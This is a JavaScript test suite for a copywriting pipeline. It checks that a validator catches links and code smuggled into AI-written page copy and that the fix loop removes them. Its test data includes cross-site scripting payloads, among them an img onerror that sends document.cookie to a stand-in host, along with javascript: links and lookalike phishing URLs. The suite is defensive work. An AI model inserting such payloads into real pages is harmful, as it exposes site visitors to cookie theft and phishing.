// Links and code must not slip into the copy. Every form a Markdown renderer
// or CMS could turn into a link or a script fails the writer's check, the fix
// loop asks for it to go, and a page that keeps one is never green.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { writePage, contentProblems, allowedLinks, assemble } from '../src/core/pipeline.js';
import { normalizeBrief } from '../src/core/brief.js';
import * as H from './helpers.js';

const brief = normalizeBrief(H.brief());
const allowed = allowedLinks(brief, [], [{ url: H.NHTSA }]);
const draftOf = (body, state = {}) => assemble(brief, H.plan(), { title: 'Brake repair in Norterra | Example Auto', meta: 'm', ...state, body }, 1000);
const problems = (body, state) => contentProblems(draftOf(body, state), { brief, allowed });

const SMUGGLED = {
  'raw HTML link': 'See <a href="https://evil-casino.example.net/">our partner</a>.',
  'autolink': 'Log in at <https://phish.example.net/login>.',
  'email autolink': 'Write to <owner@phish.example.net>.',
  'footnote-style link': '[trusted][r1]\n\n[r1]: https://spam.example.net/',
  'definition with the URL on the next line': '[trusted][r1]\n\n[r1]:\n  https://spam.example.net/',
  'script tag': '<script>alert(document.cookie)</script>',
  'img onerror': `<img src=x onerror="fetch('https://x.example.net/'+document.cookie)">`,
  'unclosed tag at the end': 'Text <iframe',
  'HTML comment': 'Text <!-- hidden -->',
  'bare URL': 'Visit https://spam.example.net/ today.',
  'www URL': 'Visit www.spam.example.net today.',
  'protocol-relative URL': 'Visit //spam.example.net/x today.',
  'image': 'Here ![pixel](https://tracker.example.net/p.gif) is.',
  'javascript link': 'Click [the form](javascript:alert(1)) now.',
  'data link': 'Click [the form](data:text/html,hi) now.',
  'protocol-relative link': 'See [a guide](//spam.example.net/guide).',
  'unverified external link': 'See [a guide](https://spam.example.net/guide).',
  'lookalike host': 'See [a guide](https://example-auto.com.evil.example.net/contact/).',
  'userinfo trick': 'See [our contact page](https://example-auto.com@evil.example.net/contact/).',
  'link with a single-quoted title': "See [a guide](https://spam.example.net/guide 'Guide').",
  'unlisted internal page': 'See [our tire page](/service/tires/).',
};

for (const [name, text] of Object.entries(SMUGGLED)) {
  test(`the writer fails it: ${name}`, () => {
    const p = problems(`${H.GREEN_BODY}\n\n${text}\n`);
    assert.ok(p.length > 0, `nothing flagged for ${JSON.stringify(text)}`);
  });
}

test('allowed links and plain text pass', () => {
  assert.deepEqual(problems(H.GREEN_BODY), []);
  const ok = 'Call [our contact page](https://www.example-auto.com/contact/), email [the shop](mailto:shop@example-auto.com), or jump [to the FAQ](#faq). Prices under $100 < most quotes. 3 > 2.';
  assert.deepEqual(problems(`${H.GREEN_BODY}\n\n${ok}\n`), []);
});

test('the title and meta are checked too', () => {
  assert.match(problems(H.GREEN_BODY, { title: 'Brakes <script>x</script>' }).join('\n'), /raw HTML in the title/);
  assert.match(problems(H.GREEN_BODY, { meta: 'Book at https://spam.example.net/ now' }).join('\n'), /bare URL in the meta/);
});

const EVIL = `${H.GREEN_BODY}\n\nSee <a href="https://evil-casino.example.net/">our partner</a> and <https://phish.example.net/login>.\n\n<script>alert(document.cookie)</script>\n\n[trusted][r1]\n\n[r1]: https://spam.example.net/\n\n<img src=x onerror="fetch('https://x.example.net/'+document.cookie)">`;
const answers = (over) => ({ plan: H.plan(), draft: H.draftAnswer(EVIL), edit: H.editAnswer(EVIL), ...over });

test('smuggled links and code go back to the model, and the fixed copy is green', async () => {
  const llm = H.fakeLlm(answers({ fix: { body: H.GREEN_BODY, title: '', meta: '', changes: ['Removed the HTML and the links'], warn_notes: [] } }));
  const r = await writePage(H.brief(), { llm, net: H.fakeNet(H.nhtsaPage) });
  const report = llm.calls[3].blocks[2].text;
  for (const re of [/raw HTML in the body: '<a href/, /raw HTML in the body: '<script>'/, /raw HTML in the body: '<img/, /URL in angle brackets/, /footnote-style link definition/, /bare URL in the body: 'https:\/\/spam/]) assert.match(report, re);
  assert.equal(r.status, 'green');
  assert.doesNotMatch(r.copyDoc, /evil-casino|phish|spam\.example|onerror|<script/);
});

test('if they survive every fix round the page is red and the copy doc says not to paste it', async () => {
  const llm = H.fakeLlm(answers({ fix: { body: EVIL, title: '', meta: '', changes: [], warn_notes: [] } }));
  const r = await writePage(H.brief(), { llm, net: H.fakeNet(H.nhtsaPage) });
  assert.equal(r.status, 'red');
  assert.ok(r.check.unsafe > 0);
  assert.match(r.copyDoc, /Do not paste this copy/);
});

test('options that hold HTML or a URL are dropped, and the copy doc escapes stray tags', async () => {
  const draft = H.draftAnswer();
  draft.inbound_edits.push({ page: '/deer-valley-auto-repair/', sentence: 'See https://evil.example.net/ too.', anchor: 'evil' });
  const edit = H.editAnswer();
  edit.cta_options = [...edit.cta_options, { text: 'Book at <a href="https://evil.example.net/">here</a>', reason: 'x', recommended: false }];
  edit.fixes.push('Removed <script>alert(1)</script> from the intro');
  const r = await writePage(H.brief(), { llm: H.fakeLlm({ plan: H.plan(), draft, edit }), net: H.fakeNet(H.nhtsaPage) });
  assert.equal(r.status, 'green');
  assert.doesNotMatch(r.copyDoc, /evil\.example/);
  assert.match(r.check.report, /WARN  writer\s+dropped 2 title, subhead, CTA or inbound-edit options/);
  assert.match(r.copyDoc, /Removed &lt;script>alert\(1\)&lt;\/script>/);
});
